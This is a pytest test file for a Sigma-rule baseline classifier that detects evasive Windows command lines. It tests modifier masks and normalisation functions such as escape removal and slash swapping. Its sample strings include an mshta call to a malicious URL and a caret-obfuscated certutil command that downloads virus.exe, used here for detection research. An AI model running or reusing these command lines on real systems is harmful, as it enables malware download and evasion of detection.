import pytest
import os
import json

from amides.models.baseline.baseline import (
    BaselineClassifier,
    BaselineClassifierError,
    BaselineResult,
)


def data_path():
    return os.path.realpath(os.path.join(os.path.dirname(__file__), "../data"))


@pytest.fixture
def rules_dir():
    return os.path.join(data_path(), "sigma-study/rules/windows/process_creation")


def load_events(events_path):
    events = []
    for filename in os.listdir(events_path):
        if not filename.endswith(".json"):
            continue

        event_file = os.path.join(events_path, filename)
        with open(event_file, "r") as event_file:
            events.append(json.load(event_file))

    return events


@pytest.fixture
def evasive_events():
    events_path = os.path.join(
        data_path(), "sigma-study/events/windows/process_creation/win_apt_babyshark"
    )
    return load_events(events_path)


@pytest.fixture
def benign_events():
    events_path = os.path.join(data_path(), "socbed-sample/Microsoft-Windows-Sysmon_1")
    return load_events(events_path)


@pytest.fixture
def default_config():
    config = {
        "remove_escape_characters": True,
        "delete_whitespaces": True,
        "remove_exe": True,
        "add_exe": True,
        "swap_slash_minus": True,
        "swap_minus_slash": True,
    }

    return config


class TestBaselineResult:
    def test_init(self):
        assert BaselineResult(modifier_mask=int("11111", 2))

    mask_expected = [
        (1, "es"),
        (2, "wh"),
        (4, "rex"),
        (8, "aex"),
        (16, "mi"),
        (32, "fs"),
        (3, "es+wh"),
        (7, "es+wh+rex"),
        (5, "es+rex"),
        (63, "es+wh+rex+aex+mi+fs"),
    ]

    @pytest.mark.parametrize("mask, expected", mask_expected)
    def test_modifier_str(self, mask, expected):
        base_result = BaselineResult(modifier_mask=mask)
        assert base_result.modifier_str == expected


class TestBaselineClassifier:
    def test_init(self, rules_dir):
        assert BaselineClassifier(
            {"remove_escape_characters": True}, rules_dir=rules_dir
        )

    def test_init_invalid_modifier_config(self, rules_dir):
        with pytest.raises(BaselineClassifierError):
            _ = BaselineClassifier([], rules_dir=rules_dir)

    def test_init_invalid_rules_dir_path(self):
        with pytest.raises(BaselineClassifierError):
            _ = BaselineClassifier(
                {"remove_escape_characters": True}, rules_dir="no/such/directory"
            )

    modifier_configs = [
        (
            {
                "remove_escape_characters": True,
                "delete_whitespaces": True,
                "remove_exe": True,
                "add_exe": True,
                "swap_minus_slash": True,
                "swap_slash_minus": True,
            },
            [63],
        ),
        (
            {
                "remove_escape_characters": True,
                "delete_whitespaces": True,
                "remove_exe": True,
                "add_exe": False,
                "swap_minus_slash": True,
                "swap_slash_minus": True,
            },
            [55],
        ),
        (
            {
                "remove_escape_characters": True,
                "delete_whitespaces": False,
                "remove_exe": True,
                "add_exe": False,
                "swap_minus_slash": True,
                "swap_slash_minus": False,
            },
            [21],
        ),
    ]

    @pytest.mark.parametrize("config, expected_modifier_list", modifier_configs)
    def test_modifier_list(self, config, expected_modifier_list, rules_dir):
        baseline_clf = BaselineClassifier(config, rules_dir=rules_dir, iterative=False)
        assert baseline_clf.modifier_list == expected_modifier_list

    modifier_configs_iterative = [
        (
            {
                "remove_escape_characters": True,
                "delete_whitespaces": True,
                "remove_exe": True,
                "add_exe": True,
                "swap_minus_slash": True,
                "swap_slash_minus": True,
            },
            [1, 2, 4, 8, 16, 32],
        ),
        (
            {
                "remove_escape_characters": True,
                "delete_whitespaces": False,
                "remove_exe": True,
                "add_exe": False,
                "swap_minus_slash": True,
                "swap_slash_minus": False,
            },
            [1, 4, 16],
        ),
    ]

    @pytest.mark.parametrize(
        "config, expected_modifier_list", modifier_configs_iterative
    )
    def test_iterative_modifier_list(self, config, expected_modifier_list, rules_dir):
        baseline_clf = BaselineClassifier(config, rules_dir=rules_dir, iterative=True)
        assert baseline_clf.modifier_list == expected_modifier_list

    def test_init_empty_modifier_list(self, rules_dir):
        no_modifier_config = {
            "remove_escape_characters": False,
            "delete_whitespaces": False,
            "modify_exe": False,
            "swap_minus_slash": False,
            "swap_slash_minus": False,
        }
        with pytest.raises(BaselineClassifierError):
            _ = BaselineClassifier(no_modifier_config, rules_dir=rules_dir)

    def test_default_name(self, default_config, rules_dir):
        baseline_clf = BaselineClassifier(default_config, rules_dir=rules_dir)

        assert baseline_clf.name == "baseline_clf_0b0"

    def test_file_name_default_name(self, default_config, rules_dir):
        baseline_clf = BaselineClassifier(
            default_config, rules_dir=rules_dir, timestamp="19700101_000000"
        )

        assert baseline_clf.file_name() == "baseline_clf_0b0_19700101_000000"

    def test_file_name_custom_name(self, default_config, rules_dir):
        baseline_clf = BaselineClassifier(
            default_config,
            rules_dir=rules_dir,
            name="some_base",
            timestamp="19700101_000000",
        )

        assert baseline_clf.file_name() == "baseline_clf_some_base_19700101_000000"

    def test_create_info_dict(self, default_config, rules_dir):
        expected = {
            "name": "some_base",
            "timestamp": "19700101_000000",
            "modifier_list": [
                "remove_escape_characters",
                "delete_whitespaces",
                "remove_exe",
                "add_exe",
                "swap_minus_slash",
                "swap_slash_minus",
            ],
        }

        baseline_clf = BaselineClassifier(
            default_config,
            rules_dir=rules_dir,
            name="some_base",
            timestamp="19700101_000000",
        )
        baseline_clf._modifier_mask = int("111111", 2)

        assert baseline_clf.create_info_dict() == expected

    def test_evaluate_benign_events(self, default_config, rules_dir, benign_events):
        baseline_clf = BaselineClassifier(default_config, rules_dir=rules_dir)
        baseline_clf.evaluate_benign_events(benign_events)

        results = baseline_clf.results
        result = results.get(int("111111", 2), None)
        assert result
        assert result.precision() == 1.0
        assert result.recall() == 1.0

    def test_evaluate_evasive_events(self, default_config, rules_dir, evasive_events):
        baseline_clf = BaselineClassifier(default_config, rules_dir=rules_dir)
        baseline_clf.evaluate_evasive_events(evasive_events)

        results = baseline_clf.results
        result = results.get(int("111111", 2), None)
        assert result
        assert result.precision() == 1.0
        assert result.recall() == 0.0

    def test_evaluate_iterative(self, default_config, rules_dir, benign_events):
        baseline_clf = BaselineClassifier(
            default_config, rules_dir=rules_dir, iterative=True
        )
        baseline_clf.evaluate_benign_events(benign_events)
        results = baseline_clf.results

        assert len(results.keys()) == 6
        assert len(results.values()) == 6

    samples = [
        '"C:\\Program Files\\freeSSHd\\FreeSSHDService.exe"',
        "net.exe stop superbackupman",
        "powershell mshta http://malicioussite.com",
        "rundll32 zipfldr.dll, RouteTheCall calc.exe",
        "shutdown.exe    /r    /f    /t    00",
        'cscript C:\\\\Us"er"s\\myuser\\notmalicious."vbe" input',
        'cmd /c "certutil -verifyctl -f -split h^^^^^^^^^^^^^t^^^^^^^^^^^^6t^^^^^^^p://example.com/virus.exe"',
        "C:\\Windows\\system32\\Macromed\\Flash\\FlashPlayerUpdateService.exe",
    ]
    del_ws_expected = [
        '"C:\\Program Files\\freeSSHd\\FreeSSHDService.exe"',
        "net.exe stop superbackupman",
        "powershell mshta http://malicioussite.com",
        "rundll32 zipfldr.dll, RouteTheCall calc.exe",
        "shutdown.exe /r /f /t 00",
        'cscript C:\\\\Us"er"s\\myuser\\notmalicious."vbe" input',
        'cmd /c "certutil -verifyctl -f -split h^^^^^^^^^^^^^t^^^^^^^^^^^^6t^^^^^^^p://example.com/virus.exe"',
        "C:\\Windows\\system32\\Macromed\\Flash\\FlashPlayerUpdateService.exe",
    ]
    samples_del_ws_expected = list(zip(samples, del_ws_expected))

    @pytest.mark.parametrize("sample, expected", samples_del_ws_expected)
    def test_modifier_delete_whitespaces(self, sample, expected, rules_dir):
        base_clf = BaselineClassifier(
            {"remove_escape_characters": True}, rules_dir=rules_dir
        )
        assert base_clf._delete_whitespaces(sample) == expected

    rm_es_expected = [
        "C:\\Program Files\\freeSSHd\\FreeSSHDService.exe",
        "net.exe stop superbackupman",
        "powershell mshta http://malicioussite.com",
        "rundll32 zipfldr.dll, RouteTheCall calc.exe",
        "shutdown.exe    /r    /f    /t    00",
        "cscript C:\\\\Users\\myuser\\notmalicious.vbe input",
        "cmd /c certutil -verifyctl -f -split ht6tp://example.com/virus.exe",
        "C:\\Windows\\system32\\Macromed\\Flash\\FlashPlayerUpdateService.exe",
    ]
    sample_rm_es_expected = list(zip(samples, rm_es_expected))

    @pytest.mark.parametrize("sample, expected", sample_rm_es_expected)
    def test_modifier_remove_escape_characters(self, sample, expected, rules_dir):
        base_clf = BaselineClassifier(
            {"remove_escape_characters": True}, rules_dir=rules_dir
        )
        assert base_clf._remove_escape_characters(sample) == expected

    rm_exe_expected = [
        '"C:\\Program Files\\freeSSHd\\FreeSSHDService"',
        "net stop superbackupman",
        "powershell mshta http://malicioussite.com",
        "rundll32 zipfldr.dll, RouteTheCall calc",
        "shutdown    /r    /f    /t    00",
        'cscript C:\\\\Us"er"s\\myuser\\notmalicious."vbe" input',
        'cmd /c "certutil -verifyctl -f -split h^^^^^^^^^^^^^t^^^^^^^^^^^^6t^^^^^^^p://example.com/virus"',
        "C:\\Windows\\system32\\Macromed\\Flash\\FlashPlayerUpdateService",
    ]
    samples_rm_exe_expected = list(zip(samples, rm_exe_expected))

    @pytest.mark.parametrize("sample, expected", samples_rm_exe_expected)
    def test_modifier_remove_exe_extension(self, sample, expected, rules_dir):
        base_clf = BaselineClassifier({"remove_exe": True}, rules_dir=rules_dir)
        assert base_clf._remove_exe_extension(sample) == expected

    add_exe_expected = [
        '"C:\\Program Files\\freeSSHd\\FreeSSHDService.exe"',
        "net.exe stop superbackupman",
        "powershell.exe mshta http://malicioussite.com",
        "rundll32.exe zipfldr.dll, RouteTheCall calc.exe",
        "shutdown.exe    /r    /f    /t    00",
        'cscript.exe C:\\\\Us"er"s\\myuser\\notmalicious."vbe" input',
        'cmd.exe /c "certutil -verifyctl -f -split h^^^^^^^^^^^^^t^^^^^^^^^^^^6t^^^^^^^p://example.com/virus.exe"',
        "C:\\Windows\\system32\\Macromed\\Flash\\FlashPlayerUpdateService.exe",
    ]
    samples_add_exe_expected = list(zip(samples, add_exe_expected))

    @pytest.mark.parametrize("sample, expected", samples_add_exe_expected)
    def test_modifier_add_exe(self, sample, expected, rules_dir):
        base_clf = BaselineClassifier({"add_exe": True}, rules_dir=rules_dir)
        assert base_clf._add_exe_extension(sample) == expected

    mi_sl_expected = [
        '"C:\\Program Files\\freeSSHd\\FreeSSHDService.exe"',
        "net.exe stop superbackupman",
        "powershell mshta http://malicioussite.com",
        "rundll32 zipfldr.dll, RouteTheCall calc.exe",
        "shutdown.exe    /r    /f    /t    00",
        'cscript C:\\\\Us"er"s\\myuser\\notmalicious."vbe" input',
        'cmd /c "certutil /verifyctl /f /split h^^^^^^^^^^^^^t^^^^^^^^^^^^6t^^^^^^^p://example.com/virus.exe"',
        "C:\\Windows\\system32\\Macromed\\Flash\\FlashPlayerUpdateService.exe",
    ]
    samples_mi_sl_expected = list(zip(samples, mi_sl_expected))

    @pytest.mark.parametrize("sample, expected", samples_mi_sl_expected)
    def test_modifier_swap_minus_with_forwardslash(self, sample, expected, rules_dir):
        base_clf = BaselineClassifier({"swap_minus_slash": True}, rules_dir=rules_dir)
        assert base_clf._swap_minus_with_forwardslash(sample) == expected

    sl_mi_expected = [
        '"C:\\Program Files\\freeSSHd\\FreeSSHDService.exe"',
        "net.exe stop superbackupman",
        "powershell mshta http:--malicioussite.com",
        "rundll32 zipfldr.dll, RouteTheCall calc.exe",
        "shutdown.exe    -r    -f    -t    00",
        'cscript C:\\\\Us"er"s\\myuser\\notmalicious."vbe" input',
        'cmd -c "certutil -verifyctl -f -split h^^^^^^^^^^^^^t^^^^^^^^^^^^6t^^^^^^^p:--example.com-virus.exe"',
        "C:\\Windows\\system32\\Macromed\\Flash\\FlashPlayerUpdateService.exe",
    ]
    samples_sl_mi_expected = list(zip(samples, sl_mi_expected))

    @pytest.mark.parametrize("sample,expected", samples_sl_mi_expected)
    def test_modifier_swap_forwardslash_with_minus(self, sample, expected, rules_dir):
        base_clf = BaselineClassifier({"swap_slash_minus": True}, rules_dir=rules_dir)
        assert base_clf._swap_forwardslash_with_minus(sample) == expected
